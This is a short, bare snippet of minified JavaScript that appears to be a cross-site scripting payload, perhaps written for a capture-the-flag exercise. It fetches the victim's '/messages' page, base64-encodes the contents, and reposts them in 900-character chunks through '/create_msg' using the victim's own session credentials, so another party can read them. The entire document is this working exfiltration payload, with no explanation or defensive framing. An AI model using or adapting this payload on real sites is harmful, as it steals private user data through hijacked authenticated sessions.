(async()=>{let raw="";try{raw=await (await fetch("/messages",{cache:"no-store"})).text()}catch(e){raw="ERR_FETCH:"+e}const send=msg=>fetch("/create_msg",{method:"POST",headers:{"Content-Type":"application/json"},credentials:"include",body:JSON.stringify({message:msg})});try{let b=btoa(raw);for(let i=0;i<b.length;i+=900){await send("PART "+(i/900+1)+": "+b.slice(i,i+900))}}catch(e){await send("ERR_STORE:"+String(e))}})();
